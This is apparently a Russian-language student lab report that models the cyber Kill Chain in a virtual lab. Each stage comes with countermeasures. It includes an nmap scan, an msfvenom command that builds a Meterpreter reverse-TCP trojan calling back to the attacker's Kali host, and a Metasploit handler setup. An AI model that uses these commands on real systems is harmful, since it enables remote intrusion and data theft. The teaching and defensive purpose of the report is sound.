## Лабораторная работа №6. Моделирование Kill-chain процедур  
Выполнения ячейкой из трех человек: Ваюкин Михаил, Матушкин Павел, Шишков Артем  
**Цель:** Продемонстрировать каждый этап Kill Chain и показать, как его можно обнаружить или остановить.  
## Этап 1 Разведка (Reconnaissance)  
Цель: собрать информацию о целевом объекте.
Для разведки нам понадобится машина (ПК), с которой будем делать все основные этапа нашего Kill Chain. Под эти задачи хорошо подойдет АРМ с операционной системой Kali Linux.   
Откроем терминал Kali Linux и выполним команду nmap -sV 192.168.88.84, чтобы узнать какие порты открыты на машине жертвы. Это нужно нам для того, чтобы понять тонкие места, куда стоит бить.  
  
![nmap]()  
Контрмеры:  
- Закрытие всех неиспользуемых портов на хосте и сетевом периметре;
- Использование межсетевых экранов;
- Включение IDS/IPS для обнаружения сетевого сканирования;
- Ограничение ICMP-запросов;
- Регулярный аудит открытых портов и сервисов.  

## Этап 2: Создание «оружия» (Weaponization)
**Цель:** создать вредонос с полезной нагрузкой при помощи, которого мы сможем получить удаленный доступ к компьютеру жертвы.  
Воспользуемся утилитой **_msfvenom_** для создания трояна. Введем для этого следующую команду:  
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP-адрес Kali> LPORT=4444 -f exe > payload.exe.  
![weapon]()  

Она создаст исполняемый файл с расширением .exe, который жертва должна будет запустить на своем компе, для успешного проведения атаки. 
Суть команды заключается в том, что мы задаем бэкдор reverse tcp и указываем, куда нужно подключаться (IP Kali Linux и порт).  

Контрмеры:  
- Использование актуальных антивирусных решений с сигнатурным и эвристическим анализом;
- Применение EDR/XDR-систем для выявления подозрительных бинарных файлов;
- Запрет запуска неподписанных и неизвестных исполняемых файлов;
- Контроль целостности ПО и белые списки приложений.

## Этап 3: Доставка (Delivery)
**Цель:** доставить нашу вредоносную программу на компьютер жертвы.  
Данный этап можно исполнить большим количеством способов, самый простые и очевидные – письмо с вредоносом, замаскированным под обычный рабочий документ или вредоносная ссылка, при переходе по которой человек качает себе вредоносный файл на устройство. 
Но в ходе лабораторной работы допускается простой перенос файла с одной виртуалки на другую, поэтому я использовал sftp подключение.  
![delivery]()  

Контрмеры:  
- Почтовые шлюзы с антифишинговой и антивирусной фильтрацией;
- Сканирование всех загружаемых файлов (в том числе по SFTP);
- Ограничение прав пользователей на загрузку и передачу исполняемых файлов;
- Обучение пользователей распознаванию фишинга и социальной инженерии;
- DLP-системы для контроля передачи файлов.  

## Этап 4: Эксплуатация (Exploitation) и Этап 5: Установка (Installation)
**Цель:** спровоцировать жертву запустить вредоносный файл или просто дождаться, когда она сделает это самостоятельно, после чего получить контроль над системой.  
Настроим **_msfconsole_**, а именно обработчик, чтобы он ожидал соединение, спровоцированное полезной нагрузкой нашего вредоноса.   
![msfconsole]()  

Запускаем msfconcole и делаем настройку обработчика при помощи следующих команд:  
```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <IP-адрес Kali>
set LPORT 4444
exploit
```
![comands]()  

После этого наша жертва запускает файл с полезной нагрузкой. И запустилась сессия.  
![session]()  

Контрмеры “Эксплуатация”:  
- Регулярное обновление ОС и прикладного ПО (patch management);
- Запуск пользователей без административных прав;
- Использование Exploit Protection (DEP, ASR, EMET/Windows Defender Exploit Guard);
- Блокировка макросов и активного контента по умолчанию.



Контрмеры “Установка”:  
- Мониторинг автозагрузки и служб ОС;
- Контроль изменений в реестре и системных каталогах;
- EDR-решения для выявления persistence-механизмов;
- Ограничение прав на запись в системные директории.


## Этап 6: Установление командования и управления
**Цель:** проверить что доступ установлен.  
Для проверки введем пару команд для проверки которые выведут информацию о системе жертвы.   
![comands victim]()  

Команды отработали исправно, тем самым доказав, что у нас есть доступ к машине жертвы.  

Контрмеры:
- Контроль исходящих соединений на firewall;
- Ограничение доступа к интернету по принципу минимально необходимого;
- Анализ сетевого трафика (NetFlow, SIEM);
- Блокировка неизвестных IP-адресов и подозрительных портов;
- Использование DNS-фильтрации и TLS-инспекции (WebProxy).

## Этап 7: Действия по достижению цели (Actions on Objectives)
**Цель:** демонстрация возможностей злоумышленника.   
Для начала сделаем снимок экрана жертвы.  
![screenshot]()  

Пробуем запустить командную строку с устройства жертвы.  
![command line]()  

Загружаем файл на зараженное устройство жертвы.  
![downlowad file]()  
  
  
![mal file]()  
Вот собственно файл и его содержимое, которое мы загрузили на зараженную машину.

Создадим файл на машине жертвы.  
![create file]()  


Затем скачаем этот файл через наш бэкдор – успешно, все получилось.  
![secreet file]()  
  

Контрмеры:
- Контроль доступа к файлам и журналирование действий пользователей;
- DLP для предотвращения утечек информации;
- Ограничение командных интерпретаторов и удаленного администрирования;
- Регулярный анализ логов безопасности;
- Быстрое реагирование: изоляция хоста при обнаружении компрометации.
